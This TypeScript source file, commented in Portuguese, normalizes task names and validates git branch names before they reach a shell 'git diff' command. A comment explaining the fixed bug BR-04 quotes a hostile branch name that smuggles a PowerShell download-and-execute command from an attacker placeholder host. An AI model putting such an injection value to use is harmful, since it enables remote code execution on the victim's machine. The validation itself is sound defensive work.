/**
 * Normalização do nome de tarefa. Vive no `shared` porque os dois lados
 * precisam da MESMA função: o core, pra criar branch e pasta, e a UI, pra
 * mostrar no diálogo "Nova tarefa" o branch que vai nascer antes de submeter.
 * Duas implementações "iguais" divergiriam no primeiro caractere exótico.
 */

import { t } from './i18n/index.js';

/**
 * As duas mensagens daqui são `Error` que o CORE apanha e re-embrulha
 * (`InvalidTaskNameError`), ou que a UI apanha antes de montar um comando.
 * Nenhuma delas vira `error.message` de resposta HTTP por conta própria — quem
 * escreve o texto que chega ao dono é sempre a BORDA, com o idioma do instante
 * (spec §13, ruling da Task 2). O `t('pt-BR', …)` daqui é o texto de LOG e de
 * stack trace, que é o mesmo papel do `Error.message` de `core/src/errors.ts`.
 */

/** Teto do nome de branch/pasta de tarefa. */
export const TASK_NAME_MAX = 60;

/**
 * Nomes de DISPOSITIVO do Windows: `con`, `nul`, `com1`… não podem virar pasta
 * (o SO recusa, e em alguns caminhos escreve no dispositivo em vez do disco).
 * A regra do Windows pega o nome inteiro E o pedaço antes do primeiro ponto,
 * por isso `con.txt` também entra — mas `console` e `com10` não.
 */
const WINDOWS_RESERVED = /^(con|prn|aux|nul|com[1-9]|lpt[1-9])(\..*)?$/;

/**
 * "Feat Mailbox!" → "feat-mailbox".
 *
 * Minúsculas, espaço vira `-`, sobra só `[a-z0-9._-]`, `-` repetido colapsa e
 * as pontas não ficam com `-` nem `.` (nome de branch não pode terminar em `.`,
 * e pasta terminada em `.` é inválida no Windows). Máximo de 60 caracteres.
 *
 * Lança quando não sobra nada: um branch de nome vazio criaria um worktree em
 * `.worktrees/` — a própria pasta raiz.
 */
export function normalizeTaskName(name: string): string {
  const normalized = name
    .toLowerCase()
    .replace(/\s+/g, '-')
    .replace(/[^a-z0-9._-]/g, '')
    .replace(/-{2,}/g, '-');
  const trimmed = trimEdges(normalized).slice(0, TASK_NAME_MAX);
  // O corte em 60 pode ter deixado um `-`/`.` solto na ponta.
  const result = trimEdges(trimmed);
  if (result === '') throw new Error(t('pt-BR', 'core.erro.nomeTarefaInvalido', { nome: name }));
  // `..` sobrevive à normalização (o ponto é caractere válido de branch) e
  // viraria travessia de diretório em qualquer caminho montado com o nome —
  // `.worktrees/a..b` é inofensivo, mas a regra existe pra o nome NUNCA
  // carregar um segmento de subida.
  if (result.includes('..')) throw new Error(t('pt-BR', 'core.erro.nomeTarefaInvalido', { nome: name }));
  if (WINDOWS_RESERVED.test(result)) throw new Error(t('pt-BR', 'core.erro.nomeTarefaInvalido', { nome: name }));
  return result;
}

function trimEdges(value: string): string {
  return value.replace(/^[-.]+/, '').replace(/[-.]+$/, '');
}

/**
 * Linha de comando do "Ver diff" — vai pro PTY de um painel novo, por isso é
 * string e não `string[]`. `--no-pager` porque o `less` do git dentro de um
 * terminal do Bridge esperaria uma tecla que o usuário não sabe que precisa
 * apertar; `base...HEAD` (três pontos) mostra só o que a tarefa fez, não o que
 * o base andou pra frente.
 *
 * Vive aqui (e não no core nem na UI) porque os dois lados precisam da MESMA
 * linha: o core escreve no PTY, a UI mostra no `title` do menu.
 */
/**
 * Forma aceitável de um nome de ref (branch/base) que o Bridge vai passar
 * adiante — pro git como argumento e, no caso do "Ver diff", pra dentro de uma
 * LINHA DE COMANDO escrita num shell.
 *
 * BR-04: o git aceita `;`, `&`, `|`, `$`, `` ` ``, `(`, `)`, `'`, `"` em nome
 * de branch. Um repositório cuja branch principal se chame
 * `main;iwr https://evil.example/x.ps1|iex` transformava o botão "Ver diff"
 * em execução de comando no pwsh do dono. Aqui só passa o que é nome de ref
 * de verdade: começa com letra/dígito, tem no máximo 200 caracteres e usa
 * apenas `A-Za-z0-9._/-`.
 *
 * `..` fica de fora de propósito (é `<base>...HEAD` que o diff monta, e um
 * `..` no meio do nome é o mesmo segmento de subida que `normalizeTaskName`
 * recusa).
 */
export const REF_MAX = 200;
const REF_SHAPE = /^[A-Za-z0-9][A-Za-z0-9._/-]{0,199}$/;

export function isSafeRef(ref: string): boolean {
  if (!REF_SHAPE.test(ref)) return false;
  if (ref.includes('..')) return false;
  if (ref.endsWith('/') || ref.endsWith('.')) return false;
  return true;
}

export function diffCommand(base: string): string {
  if (!isSafeRef(base)) throw new Error(t('pt-BR', 'core.erro.refInvalida', { ref: base }));
  // Aspas simples mesmo com a ref já validada: é a segunda barreira, e tanto o
  // PowerShell quanto o bash concatenam `'x'...HEAD` num argumento só.
  return `git --no-pager diff '${base}...HEAD'`;
}
